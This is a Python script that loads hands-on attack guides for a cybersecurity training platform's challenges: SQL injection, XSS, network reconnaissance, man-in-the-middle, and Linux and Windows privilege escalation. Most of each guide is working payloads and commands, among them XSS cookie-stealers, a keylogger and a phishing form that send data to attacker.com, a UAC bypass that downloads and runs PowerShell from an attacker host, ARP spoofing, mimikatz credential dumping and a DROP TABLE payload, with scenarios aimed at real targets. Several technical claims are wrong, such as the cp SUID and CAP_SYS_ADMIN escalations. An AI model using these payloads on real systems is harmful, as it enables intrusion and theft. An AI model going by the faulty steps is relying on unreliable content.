#!/usr/bin/env python
"""
Populate Challenge Execution Guides
This script adds comprehensive, step-by-step execution guides to existing challenges
so students can easily follow along and learn cybersecurity concepts.
"""

from app import app, db, Challenge

def update_challenges():
    """Update all challenges with comprehensive execution guides."""
    
    with app.app_context():
        # SQL Injection Mastery
        sql_injection = Challenge.query.filter_by(name='SQL Injection Mastery').first()
        if sql_injection:
            sql_injection.how_to_execute = """
# SQL Injection Mastery - Step-by-Step Execution Guide

## Prerequisites
- Access to the vulnerable web application at http://192.168.1.10
- Basic understanding of SQL syntax
- Firefox or Chrome browser with developer tools

## Complete Execution Steps

### Step 1: Identify the Vulnerability
1. Navigate to http://192.168.1.10/login
2. Open browser Developer Tools (Press F12)
3. Go to the "Network" tab
4. Try login with credentials: `admin' OR '1'='1` as username and `password` as password
5. Observe the SQL query in the browser console or network request

**What you'll see:** The login bypasses because SQL becomes `SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='password'`

### Step 2: Basic SQL Injection (UNION-based)
1. Go to the search box at http://192.168.1.10/search
2. Enter: `' UNION SELECT username, password FROM users --`
3. Click Search
4. The database results will show all usernames and passwords

**Command breakdown:**
- `'` - Closes the initial quote
- `UNION SELECT` - Combines results from another query
- `username, password FROM users` - Selects user credentials
- `--` - Comments out the rest of the original query

### Step 3: Determine Number of Columns
1. Try: `' UNION SELECT NULL --`
2. If error, try: `' UNION SELECT NULL, NULL --`
3. Keep adding NULLs until no error appears
4. This tells you how many columns the original query has

**Commands to try in order:**
```
' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
' UNION SELECT NULL, NULL, NULL --
' UNION SELECT NULL, NULL, NULL, NULL --
```

### Step 4: Extract Database Information
1. Use information_schema to find table names:
```
' UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema=database() --
```

2. List all columns in a table:
```
' UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name='users' --
```

### Step 5: Time-based Blind SQL Injection
When UNION doesn't work, use time delays:

1. Go to login page
2. Username field: `admin' AND SLEEP(5) --`
3. If response takes 5 seconds, it's vulnerable
4. If it sleeps, the injection worked!

**Explanation:** If the query is `SELECT * FROM users WHERE username='admin' AND SLEEP(5) --'`, the SLEEP(5) will pause the database.

### Step 6: Boolean-based Blind SQL Injection
1. Username: `admin' AND '1'='1`
2. Should show "Valid username"
3. Try: `admin' AND '1'='2`
4. Should show "Invalid username"
5. Use these true/false responses to extract data character by character

### Step 7: Extract Data Blind
To extract password character by character when UNION doesn't work:

```sql
admin' AND SUBSTRING(password,1,1)='a' --
admin' AND SUBSTRING(password,1,1)='b' --
admin' AND SUBSTRING(password,1,1)='c' --
```

When you get a "Valid" response, that's the correct character!

### Step 8: Using sqlmap (Automated)
Open terminal and run:

```bash
sqlmap -u "http://192.168.1.10/login" --data="username=admin&password=pass" --dbs
```

This will:
- Find SQL injection automatically
- List all databases
- Extract tables and data

**More sqlmap commands:**
```bash
# Get all tables
sqlmap -u "http://192.168.1.10/login" --data="username=admin&password=pass" -D vulnerable_db --tables

# Extract specific table
sqlmap -u "http://192.168.1.10/login" --data="username=admin&password=pass" -D vulnerable_db -T users --dump

# Get database user
sqlmap -u "http://192.168.1.10/login" --data="username=admin&password=pass" --current-user

# Read files
sqlmap -u "http://192.168.1.10/login" --data="username=admin&password=pass" --file-read="/etc/passwd"
```

## Real-World Scenarios

### Scenario 1: Website Login Bypass
Target: Any login form
Payload: `admin' --`
Result: Logs in as admin without password

### Scenario 2: Data Extraction
Target: Search functionality
Payload: `' OR '1'='1`
Result: Returns all records instead of filtered results

### Scenario 3: Database Manipulation
Target: Any form field
Payload: `'; DROP TABLE users; --`
Result: Could delete the entire users table (destructive!)

## Prevention Methods (For Developers)
1. **Use Prepared Statements**
   ```sql
   SELECT * FROM users WHERE username = ? AND password = ?
   ```

2. **Input Validation**
   - Whitelist allowed characters
   - Reject special characters like `' " ; --`

3. **Escape Special Characters**
   - Use mysqli_real_escape_string() or equivalent

4. **Principle of Least Privilege**
   - Database user should have minimal permissions

## Flag Location
After successfully extracting data, look for the flag in:
- `flags` table with column `flag_sql_injection`
- Or in a user record marked as "admin_flag"

## Summary
SQL Injection occurs when user input is directly concatenated into SQL queries. Always use parameterized queries and validate input.
"""
            db.session.commit()
            print("[OK] Updated: SQL Injection Mastery")

        # XSS Challenge
        xss = Challenge.query.filter_by(name='XSS (Cross-Site Scripting)').first()
        if xss:
            xss.how_to_execute = """
# XSS (Cross-Site Scripting) - Complete Execution Guide

## Prerequisites
- Firefox or Chrome browser
- Developer Tools knowledge (F12)
- Understanding of HTML and JavaScript basics

## Complete Execution Steps

### Step 1: Identify the Vulnerability
1. Go to http://192.168.1.10/profile
2. Click "Edit Profile"
3. In the "About Me" field, enter: `<h1>XSS Test</h1>`
4. Save and view profile
5. If the heading displays (not escaped), it's vulnerable to XSS

### Step 2: Basic Alert Box (Stored XSS)
1. Go to comment section at http://192.168.1.10/post/1
2. In the comment field, paste:
```javascript
<script>alert('XSS Vulnerability Found!');</script>
```
3. Post the comment
4. When the page reloads, an alert box appears
5. This proves JavaScript execution

### Step 3: Cookie Stealing (Session Hijacking)
1. In comment field, paste:
```javascript
<script>
fetch('http://attacker.com/steal.php?cookie=' + document.cookie);
</script>
```
2. This sends the victim's session cookie to attacker's server
3. Attacker can then use that cookie to impersonate the user

**On your test server, use:**
```javascript
<script>
console.log('My cookies: ' + document.cookie);
alert(document.cookie);
</script>
```

### Step 4: Reflected XSS via URL
1. Navigate to: `http://192.168.1.10/search?q=test`
2. The search parameter is reflected in the page
3. Try: `http://192.168.1.10/search?q=<img src=x onerror=alert('XSS')>`
4. If alert appears, reflected XSS confirmed

### Step 5: Event Handler Injection
1. Try in comment field:
```html
<img src=x onerror=alert('XSS via img')>
<svg onload=alert('XSS via svg')>
<body onload=alert('XSS via body')>
<input onfocus=alert('XSS via input') autofocus>
```

2. Each one uses different HTML elements to execute JavaScript

### Step 6: Bypass Filters
If simple `<script>` tags are blocked, try:

```html
<!-- Alternative 1: Event handlers -->
<img src=x onerror=alert('XSS')>

<!-- Alternative 2: Style tags -->
<style>@import'http://attacker.com/xss.css';</style>

<!-- Alternative 3: Case variation -->
<ScRiPt>alert('XSS')</sCrIpT>

<!-- Alternative 4: Encoding -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>

<!-- Alternative 5: SVG based -->
<svg><script>alert('XSS')</script></svg>

<!-- Alternative 6: Iframe injection -->
<iframe src="javascript:alert('XSS')"></iframe>
```

### Step 7: Session Stealing (Advanced)
1. Set up a simple server on attacker machine:
```bash
python3 -m http.server 8888
```

2. Inject payload:
```javascript
<script>
new Image().src = 'http://ATTACKER_IP:8888/?c=' + btoa(document.cookie);
</script>
```

3. Check server logs to see encoded cookies

4. Decode with:
```bash
echo "BASE64_STRING" | base64 -d
```

### Step 8: Keylogger Injection
1. Paste in vulnerable field:
```javascript
<script>
document.addEventListener('keypress', function(e) {
    console.log('Key pressed: ' + e.key);
    fetch('http://attacker.com/log?key=' + e.key);
});
</script>
```

2. Now every key the user types is logged

### Step 9: Using Burp Suite (Advanced)
1. Open Burp Suite
2. Set browser proxy to localhost:8080
3. Browse to vulnerable site
4. Right-click request → "Send to Repeater"
5. In Repeater, modify the comment field with XSS payload
6. Send request and observe response

### Step 10: Using BeEF (Browser Exploitation Framework)
1. Start BeEF:
```bash
./beef
```

2. Access at http://localhost:3000
3. Inject BeEF hook:
```javascript
<script src="http://localhost:3000/hook.js"></script>
```

4. BeEF will show connected browsers
5. Run attacks from BeEF console on hooked victims

## Real-World Attack Scenarios

### Scenario 1: Phishing via XSS
Create fake login form and steal credentials:
```html
<script>
document.body.innerHTML = `
<div style="border:1px solid black; padding:20px; width:300px; margin:50px auto;">
  <h2>Session Expired</h2>
  <p>Please login again:</p>
  <form id="phish">
    Username: <input type="text" id="user"><br>
    Password: <input type="password" id="pass"><br>
    <button type="button" onclick="steal()">Login</button>
  </form>
</div>
<script>
function steal() {
  fetch('http://attacker.com/creds.php?u=' + document.getElementById('user').value + 
        '&p=' + document.getElementById('pass').value);
}
</script>
`;
</script>
```

### Scenario 2: Malware Distribution
```javascript
<script>
// Download and execute malware
let img = new Image();
img.src = 'http://attacker.com/malware.exe';
</script>
```

### Scenario 3: Website Defacement
```javascript
<script>
document.body.style.backgroundImage = 'url(http://attacker.com/takeover.jpg)';
document.body.innerHTML = '<h1 style="color:red;">HACKED!</h1>';
</script>
```

## Prevention Methods (For Developers)

### 1. HTML Escaping
```php
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```

### 2. Content Security Policy (CSP)
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

### 3. Input Validation
```javascript
// Only allow alphanumeric
if (!/^[a-zA-Z0-9]*$/.test(input)) {
    reject();
}
```

### 4. Use Security Libraries
```javascript
DOMPurify.sanitize(userInput);
```

## Flag Extraction
After successful XSS, extract flag from:
- Admin's browser console
- Stored in window.flag
- Admin's cookies
- Hidden in page source

## Commands Summary
```bash
# Test basic XSS
curl "http://192.168.1.10/search?q=<script>alert('XSS')</script>"

# Test with encoding
curl "http://192.168.1.10/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E"

# Start local server for exfiltration
python3 -m http.server 8888
```

## Summary
XSS vulnerabilities allow attackers to inject malicious scripts into web pages. Always sanitize and escape user input on both client and server side.
"""
            db.session.commit()
            print("[OK] Updated: XSS (Cross-Site Scripting)")

        # Network Reconnaissance
        network_recon = Challenge.query.filter_by(name='Network Reconnaissance').first()
        if network_recon:
            network_recon.how_to_execute = """
# Network Reconnaissance - Complete Execution Guide

## Prerequisites
- Linux terminal or Kali Linux
- Basic networking knowledge
- Target network: 192.168.1.0/24
- Tools: nmap, netcat, Wireshark, curl

## Complete Execution Steps

### Step 1: Active Host Discovery
1. Open terminal
2. Use ping sweep to find live hosts:
```bash
nmap -sn 192.168.1.0/24
```

3. Expected output shows IP addresses and MAC addresses of active hosts
4. Note down all live IPs

**What each option means:**
- `-sn`: Ping scan (no port scan)
- `192.168.1.0/24`: Network range (256 IP addresses)

### Step 2: Port Scanning
1. Scan a specific host for open ports:
```bash
nmap -p- 192.168.1.10
```

2. This scans all 65535 ports
3. Look for OPEN ports (common: 22=SSH, 80=HTTP, 443=HTTPS)

**Faster version (common ports only):**
```bash
nmap 192.168.1.10
```

### Step 3: Service Version Detection
1. Detect what services are running:
```bash
nmap -sV 192.168.1.10
```

2. Output shows service names and versions
3. Example: `80/tcp open http Apache httpd 2.4.41`

### Step 4: Operating System Detection
1. Fingerprint the OS:
```bash
nmap -O 192.168.1.10
```

2. Shows estimated operating system (Linux, Windows, etc.)
3. Also shows TCP/IP stack fingerprint

### Step 5: Aggressive Scan (All Information)
1. Combine all scans:
```bash
nmap -A 192.168.1.10
```

2. This includes:
   - Port scanning
   - Service version detection
   - OS detection
   - Script scanning

### Step 6: UDP Scanning
1. Some services use UDP instead of TCP:
```bash
nmap -sU 192.168.1.10
```

2. Common UDP services:
   - 53: DNS
   - 161: SNMP
   - 5353: mDNS

### Step 7: NSE (Nmap Scripting Engine)
1. Run vulnerability checks:
```bash
nmap --script vuln 192.168.1.10
```

2. Specific useful scripts:
```bash
# HTTP service enumeration
nmap --script http-methods 192.168.1.10 -p 80

# Check for SSL vulnerabilities
nmap --script ssl-enum-ciphers -p 443 192.168.1.10

# Detect live hosts and enumerate
nmap --script smb-enum-shares 192.168.1.10
```

### Step 8: Banner Grabbing
1. Connect directly to services and get banners:
```bash
nc -v 192.168.1.10 22
```

2. Press Ctrl+C to exit
3. Banner shows service type and version
4. Example: `SSH-2.0-OpenSSH_7.4`

### Step 9: Web Service Enumeration
1. Scan for web directories:
```bash
gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt
```

2. Found directories appear with status codes:
   - 200: OK (directory exists)
   - 403: Forbidden (exists but no access)
   - 404: Not Found

3. You can also try:
```bash
curl -v http://192.168.1.10/admin
curl -v http://192.168.1.10/login
curl -v http://192.168.1.10/api
```

### Step 10: DNS Enumeration
1. Get DNS records:
```bash
nslookup 192.168.1.10
dig 192.168.1.10
```

2. DNS transfer attempt:
```bash
dig @192.168.1.10 axfr
```

3. This attempts zone transfer (usually blocked)

### Step 11: Traceroute Analysis
1. Trace network path to target:
```bash
traceroute 192.168.1.10
```

2. Shows all hops (routers) between you and target
3. Helps identify network topology

### Step 12: Packet Capture with Tcpdump
1. Capture all network traffic:
```bash
sudo tcpdump -i eth0 -n
```

2. Capture specific protocol:
```bash
sudo tcpdump -i eth0 -n tcp port 80
```

3. Save to file:
```bash
sudo tcpdump -i eth0 -n -w capture.pcap
```

### Step 13: Wireshark Analysis
1. Open Wireshark:
```bash
sudo wireshark
```

2. Select network interface
3. Start capture
4. Browse to target website or perform activity
5. Stop capture
6. Filter by protocol: `tcp.port == 80`
7. Analyze HTTP requests and responses

### Step 14: Complete Automated Scan
1. Run full reconnaissance:
```bash
nmap -A -T4 -p- 192.168.1.10 -oN scan_results.txt
```

2. Options explained:
   - `-A`: Aggressive (all info)
   - `-T4`: Timing (fast)
   - `-p-`: All ports
   - `-oN`: Output to file

3. View results:
```bash
cat scan_results.txt
```

### Step 15: Export and Analyze Results
1. Export to XML for further analysis:
```bash
nmap -A 192.168.1.10 -oX scan_results.xml
```

2. Convert to HTML:
```bash
nmap -A 192.168.1.10 -oH scan_results.html
```

3. View in browser for better visualization

## Real-World Reconnaissance Example

### Complete Target Assessment:
```bash
# Step 1: Discover the target
nmap -sn 192.168.1.0/24

# Step 2: Get basic info
nmap -sV 192.168.1.10

# Step 3: Enumerate all services
nmap -A -p- 192.168.1.10

# Step 4: Check for vulnerabilities
nmap --script vuln 192.168.1.10

# Step 5: Web service details
nmap --script http-title 192.168.1.10 -p 80

# Step 6: Banner grab SSH
nc 192.168.1.10 22

# Step 7: DNS info
nslookup 192.168.1.10

# Step 8: Detailed report
nmap -A -T4 -p- 192.168.1.10 -oA detailed_scan
```

## Information Gathering Tools

| Tool | Purpose | Command |
|------|---------|---------|
| nmap | Port scanning | `nmap -A target` |
| masscan | Fast port scanner | `masscan -p0-65535 target` |
| hping3 | Custom packets | `hping3 -S target -p 80` |
| netcat | Banner grab | `nc -v target port` |
| shodan | Internet search | `shodan search http` |
| dig | DNS lookup | `dig @dns target` |
| whois | Domain info | `whois domain.com` |
| curl | Web requests | `curl -v http://target` |

## Flag Location
After reconnaissance, look for:
- Service banners containing version info
- Hidden directories found by gobuster
- DNS records with information
- Comment in HTTP headers
- Flag in `/hidden` or `/flag` directories

## Summary
Network reconnaissance gathers information about target systems. Always use with permission and document findings.
"""
            db.session.commit()
            print("[OK] Updated: Network Reconnaissance")

        # Man-in-the-Middle Attack
        mitm = Challenge.query.filter_by(name='Man-in-the-Middle Attack').first()
        if mitm:
            mitm.how_to_execute = """
# Man-in-the-Middle (MITM) Attack - Complete Execution Guide

## Prerequisites
- Kali Linux or Linux machine
- Network access to target
- Tools: arpspoof, tcpdump, mitmproxy, ettercap
- Target network: 192.168.1.0/24

## Complete Execution Steps

### Step 1: Enable IP Forwarding
1. Open terminal and enable packet forwarding:
```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

2. Verify it's enabled:
```bash
cat /proc/sys/net/ipv4/ip_forward
# Should output: 1
```

### Step 2: Identify Target and Gateway
1. Find your gateway:
```bash
route -n
# Gateway is usually 192.168.1.1
```

2. Find target IP:
```bash
arp-scan -l
# Or: nmap -sn 192.168.1.0/24
```

3. Note: Gateway IP (e.g., 192.168.1.1) and Target IP (e.g., 192.168.1.100)

### Step 3: ARP Spoofing - Tell Target We're Gateway
1. Spoof ARP packets to target:
```bash
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
```

This tells the target that we (attacker) are the gateway.

### Step 4: ARP Spoofing - Tell Gateway We're Target
1. In another terminal, spoof gateway:
```bash
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
```

This tells the gateway that we (attacker) are the target.

**Now traffic flows: Target → Attacker → Gateway**

### Step 5: Capture Traffic with Tcpdump
1. In a third terminal, capture traffic:
```bash
sudo tcpdump -i eth0 -n 'tcp port 80 or tcp port 443 or tcp port 21'
```

2. This captures HTTP, HTTPS, and FTP traffic
3. Look for login credentials in HTTP requests

### Step 6: Using Mitmproxy for HTTP Interception
1. Install mitmproxy:
```bash
sudo apt update && sudo apt install mitmproxy -y
```

2. Set up iptables to redirect traffic to mitmproxy:
```bash
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
```

3. Start mitmproxy:
```bash
mitmproxy -p 8080
```

4. Access mitmproxy at http://localhost:8080
5. View all HTTP requests intercepted

### Step 7: Extract Credentials from HTTP
1. With mitmproxy running, when target visits a login page:
2. Look for POST requests with credentials
3. Example: `POST /login` with `username=admin&password=secret`
4. Credentials are captured in plaintext

### Step 8: SSL/HTTPS Stripping
1. Use sslstrip to downgrade HTTPS to HTTP:
```bash
sudo apt install sslstrip -y
```

2. Set up iptables:
```bash
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
```

3. Start sslstrip:
```bash
sslstrip -l 8080
```

4. Now HTTPS connections become HTTP (credentials visible)

### Step 9: DNS Spoofing
1. Modify hosts file to redirect domains:
```bash
sudo nano /etc/hosts
```

2. Add line:
```
192.168.1.100 example.com
```

3. Save and exit (Ctrl+X, Y, Enter)
4. Now when target visits example.com, they see your server

### Step 10: Session Hijacking
1. Capture cookies with tcpdump:
```bash
sudo tcpdump -i eth0 -n -A 'tcp port 80' | grep -i 'cookie'
```

2. Extract JSESSIONID or session token
3. Use in your browser's developer tools to impersonate user

### Step 11: Packet Injection with Ettercap
1. Start Ettercap:
```bash
sudo ettercap -G
```

2. Select network interface (eth0)
3. Start sniffing
4. Activate ARP spoofing
5. Monitor traffic and inject commands

### Step 12: DNS Tunneling
1. Create DNS query to exfiltrate data:
```bash
nslookup exfildata.192.168.1.100
```

2. DNS queries go through attacker's DNS server
3. Server logs all queries for data extraction

### Step 13: Man-in-the-Browser (MITB)
1. Inject JavaScript during HTTP response:
```javascript
<script>
// Monitor all form submissions
document.addEventListener('submit', function(e) {
    // Exfiltrate form data
    fetch('http://attacker.com/log?data=' + new FormData(e.target));
});
</script>
```

### Step 14: Automated MITM Framework
1. Use BeEF framework:
```bash
./beef
```

2. Inject BeEF hook into target:
```html
<script src="http://attacker_ip:3000/hook.js"></script>
```

3. Hooked browsers appear in BeEF console
4. Execute commands on hooked browsers

### Step 15: Clean Up
1. Stop all attacks:
```bash
sudo arpspoof -c on
sudo iptables -t nat -F
sudo iptables -t nat -X
```

2. Disable IP forwarding:
```bash
sudo sysctl -w net.ipv4.ip_forward=0
```

## Real-World MITM Attack Scenarios

### Scenario 1: Corporate Network
- Position attacker between employee and router
- Capture all HTTP logins, emails, instant messages
- Extract credentials and sensitive data

### Scenario 2: WiFi Hotspot
- Run mitmproxy on WiFi access point
- All users connecting through attacker
- Full visibility of traffic

## Prevention Methods
- Use HTTPS (TLS/SSL)
- Verify SSL certificates
- Use VPN for public WiFi
- Certificate pinning
- Monitor ARP tables

## Summary
MITM attacks intercept communication between two parties. Always use encrypted connections and verify certificates.
"""
            db.session.commit()
            print("[OK] Updated: Man-in-the-Middle Attack")

        # Privilege Escalation
        priv_esc = Challenge.query.filter_by(name='Privilege Escalation').first()
        if priv_esc:
            priv_esc.how_to_execute = """
# Privilege Escalation - Complete Execution Guide

## Prerequisites
- Linux system with sudo
- SSH access to vulnerable server
- Basic Linux command knowledge
- Tools: sudo, GTFOBins, kernel exploits

## Complete Execution Steps

### Step 1: Check Current User Privileges
1. Open terminal and check current user:
```bash
whoami
id
```

2. Check sudo permissions:
```bash
sudo -l
```

3. Look for NOPASSWD entries (can run without password)

### Step 2: Explore SUDO Configuration
1. View sudoers file:
```bash
cat /etc/sudoers
```

2. Look for:
   - `%wheel` - All users in wheel group have sudo
   - `NOPASSWD` - No password required
   - Specific commands that don't need password

### Step 3: Privilege Escalation via SUDO
1. If user can run specific command with sudo:
```bash
sudo -l
# Output might show:
# User can run the following commands:
#   (ALL) NOPASSWD: /usr/bin/nano
```

2. If nano doesn't require password:
```bash
sudo nano
```

3. Inside nano, press Ctrl+R, then Ctrl+X
4. Type: `reset; sh 1>&0 2>&0`
5. Press Enter to spawn root shell

### Step 4: Exploit Shell Metacharacters in SUDO
1. If user can run specific command with sudo:
```bash
sudo /usr/bin/find / -name flag
```

2. Inside find, use shell escape:
```bash
sudo find /root -exec /bin/sh \;
```

3. You now have root shell

### Step 5: Check SUID Binaries
1. Find programs with SUID bit set:
```bash
find / -perm -4000 2>/dev/null
```

2. These run as owner (often root)
3. Look for unusual binaries

### Step 6: Exploit Vulnerable SUID Binary
1. Common vulnerable binary: cp (copy)
```bash
find / -name cp -perm -4000 2>/dev/null
```

2. Copy /bin/sh to /tmp:
```bash
cp /bin/sh /tmp/mysh
```

3. Since cp is SUID root, /tmp/mysh is owned by root

4. Make it a SUID binary:
```bash
chmod 4755 /tmp/mysh
/tmp/mysh
```

5. Now you have root shell

### Step 7: Check World-Writable Directories
1. Find writable directories:
```bash
find /usr/bin -writable 2>/dev/null
```

2. If you can write to /usr/bin, create malicious script:
```bash
echo '#!/bin/bash' > /usr/bin/malicious
echo '/bin/sh' >> /usr/bin/malicious
chmod +x /usr/bin/malicious
```

3. If anything calls this script, it runs as owner

### Step 8: Environment Variable Abuse
1. Check for scripts using relative paths:
```bash
find / -type f -executable 2>/dev/null | xargs grep -l 'grep\|ls\|cat\|find'
```

2. If script uses `grep` without full path:
   - Create malicious grep in your PATH:
```bash
mkdir /tmp/malicious
echo '#!/bin/bash' > /tmp/malicious/grep
echo '/bin/sh' >> /tmp/malicious/grep
chmod +x /tmp/malicious/grep
export PATH=/tmp/malicious:$PATH
```

3. When script runs grep, it uses your malicious version

### Step 9: Check for Kernel Exploits
1. Get kernel version:
```bash
uname -a
```

2. Search for exploits:
```bash
searchsploit kernel 5.4
```

3. Or check online databases (CVE details)

4. Download and compile exploit:
```bash
gcc -o exploit exploit.c
./exploit
```

### Step 10: Exploit Weak File Permissions
1. Check sensitive files:
```bash
ls -la /etc/shadow
ls -la /root/.ssh/id_rsa
```

2. If world-readable:
```bash
cat /root/.ssh/id_rsa
```

3. Use SSH key for root access:
```bash
chmod 600 id_rsa
ssh -i id_rsa root@localhost
```

### Step 11: Cron Job Manipulation
1. Check cron jobs:
```bash
crontab -l
cat /etc/crontab
```

2. If cron runs script you can modify:
```bash
ls -la /home/*/script.sh
```

3. If writable:
```bash
echo '/bin/sh' >> /home/user/script.sh
```

4. Wait for cron to execute (runs as owner, usually root)

### Step 12: Check Docker Groups
1. If user is in docker group:
```bash
id | grep docker
```

2. Docker allows full system access:
```bash
docker run -v /:/mnt -it alpine
cd /mnt
cat root/.ssh/id_rsa
```

### Step 13: Systemd Service Manipulation
1. Check user services:
```bash
systemctl list-unit-files | grep user
```

2. Edit service file:
```bash
nano ~/.config/systemd/user/myservice.service
```

3. Add malicious command:
```ini
[Service]
ExecStart=/bin/sh -c "whoami > /tmp/owner"
```

4. Enable and start:
```bash
systemctl --user enable myservice.service
systemctl --user start myservice.service
```

### Step 14: Capability-Based Escalation
1. Check for capabilities:
```bash
getcap -r / 2>/dev/null
```

2. Capabilities like CAP_SYS_ADMIN allow escalation:
```bash
# If python has CAP_SYS_ADMIN
python3 -c 'import os; os.execl("/bin/sh", "sh")'
```

### Step 15: Full Automated Privilege Escalation Script
1. Use LinEnum:
```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

2. Or use PEAS:
```bash
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | bash
```

## Real-World Privilege Escalation

### Scenario: Compromised Web Server
1. Initial access as www-data user
2. Find: `sudo -l` shows /usr/bin/nano allowed
3. Use nano escape to get root shell
4. Now have full system access

## Prevention Methods
- Remove SUID bits from unnecessary binaries
- Keep kernel updated
- Restrict sudo permissions
- Monitor cron jobs
- Use AppArmor or SELinux

## Summary
Privilege escalation exploits misconfigurations to gain root access. Always audit and minimize privileges.
"""
            db.session.commit()
            print("[OK] Updated: Privilege Escalation")

        # Windows Privilege Escalation
        win_priv_esc = Challenge.query.filter_by(name='Windows Privilege Escalation').first()
        if win_priv_esc:
            win_priv_esc.how_to_execute = """
# Windows Privilege Escalation - Complete Execution Guide

## Prerequisites
- Windows system (7, 10, Server 2016+)
- Command Prompt or PowerShell
- Tools: mimikatz, PowerUp, UACME

## Complete Execution Steps

### Step 1: Check Current Privileges
1. Open Command Prompt as current user
2. Run:
```cmd
whoami
whoami /priv
```

3. Check if part of admin group:
```cmd
net localgroup administrators
```

### Step 2: Check UAC Status
1. View User Account Control settings:
```cmd
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
```

2. If EnableLUA = 1, UAC is enabled (needs bypass)

### Step 3: Bypass UAC with Shell Fodder
1. UAC allows certain programs to run elevated
2. Use Windows built-in programs:
```cmd
eventvwr.exe
fodhelper.exe
sdclt.exe
```

3. Example - fodhelper bypass:
```cmd
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')" /f
fodhelper.exe
```

### Step 4: Token Impersonation
1. If running with SeImpersonatePrivilege:
```cmd
whoami /priv | find "SeImpersonate"
```

2. Use Rotten Potato/Juicy Potato to impersonate SYSTEM:
```cmd
.\JuicyPotato.exe -l 1337 -p C:\path\to\shell.exe -t t -c {CLSID}
```

3. Creates reverse shell as SYSTEM user

### Step 5: Check Installed Programs for Vulnerabilities
1. List installed programs:
```cmd
wmic product list
Get-Package | Select-Object Name, Version (PowerShell)
```

2. Check for known vulnerable software

### Step 6: Unquoted Service Paths
1. Find services with unquoted paths:
```cmd
wmic service list brief
```

2. Check each service:
```cmd
sc query ServiceName
sc qc ServiceName
```

3. Look for paths like: C:\Program Files\Program Name\app.exe

4. Exploit: Create malicious executable at: C:\Program.exe
5. When service restarts, your executable runs as SYSTEM

### Step 7: Weak Service Permissions
1. Check service DACL:
```cmd
icacls "C:\Program Files\VulnerableService"
```

2. If you have modify permissions, replace executable:
```cmd
copy malicious.exe "C:\Program Files\VulnerableService\app.exe"
net start VulnerableService
```

### Step 8: Scheduled Task Exploitation
1. List scheduled tasks:
```cmd
tasklist /v
Get-ScheduledTask | Get-ScheduledTaskInfo (PowerShell)
```

2. Check task properties:
```cmd
schtasks /query /tn "Task Name" /v
```

3. If task runs with SYSTEM and you control the executable:
```cmd
taskkill /TN "Task Name" /F
copy malicious.exe "path\to\task\executable.exe"
```

### Step 9: Registry Run Key Escalation
1. Check Run keys:
```cmd
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
```

2. If you can modify these (and admin runs them at logon):
```cmd
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Malware /d "C:\path\shell.exe"
```

### Step 10: DLL Hijacking
1. Find application that loads DLLs:
```cmd
Process Monitor: Search for "NAME NOT FOUND" DLL loads
```

2. Create malicious DLL with same name:
```c
// malicious.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    system("cmd /c powershell IEX(New-Object Net.WebClient).DownloadString(...)");
    return TRUE;
}
```

3. Place in directory application searches:
```cmd
copy malicious.dll "C:\Application\Folder\required.dll"
```

### Step 11: Credential Harvesting with Mimikatz
1. Download Mimikatz:
```cmd
https://github.com/gentilkiwi/mimikatz/releases
```

2. Run Mimikatz:
```cmd
.\mimikatz.exe
```

3. Inside Mimikatz:
```
privilege::debug
token::elevate
lsadump::lsa /patch
```

4. This extracts hashed passwords from LSASS

### Step 12: Living off the Land Binaries (LOLBAS)
1. Use built-in Windows tools:
```cmd
mshta.exe
wmic.exe
powershell.exe
regsvr32.exe
rundll32.exe
```

2. Example - regsvr32 for reverse shell:
```cmd
regsvr32.exe /s /n /u /i:http://attacker.com/shell.sct scrobj.dll
```

### Step 13: PowerShell Privilege Escalation
1. Check if you can run PS as admin:
```cmd
powershell -Command "Test-Path C:\Windows\System32\config\SAM"
```

2. Use PowerUp to find vulnerabilities:
```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

3. Execute recommended privilege escalation

### Step 14: Kerberoasting
1. Extract Service Principal Names (SPNs):
```cmd
GetUserSPNs.py -request domain.com/username:password
```

2. Crack extracted hashes offline:
```cmd
hashcat -m 13100 hashes.txt wordlist.txt
```

### Step 15: Custom Exploit Development
1. Identify Windows version:
```cmd
systeminfo | find "OS"
wmic os get caption, version
```

2. Search for CVE exploits:
```cmd
https://www.exploit-db.com/
```

3. Download and compile exploit:
```cmd
cd Downloads
.\exploit.exe
```

## Real-World Windows Privilege Escalation

### Scenario: Compromised User Account
1. Initial access as regular user
2. Check: `whoami /priv` - has SeImpersonate
3. Use Juicy Potato to get SYSTEM
4. Now have full admin access

## Prevention Methods
- Keep Windows updated
- Disable unnecessary services
- Use AppLocker
- Enable Code Integrity
- Monitor privilege escalation attempts

## Summary
Windows privilege escalation exploits misconfigurations. Regular patching and auditing are essential.
"""
            db.session.commit()
            print("[OK] Updated: Windows Privilege Escalation")

        print("\n" + "="*50)
        print("All 6 challenges updated with comprehensive guides!")
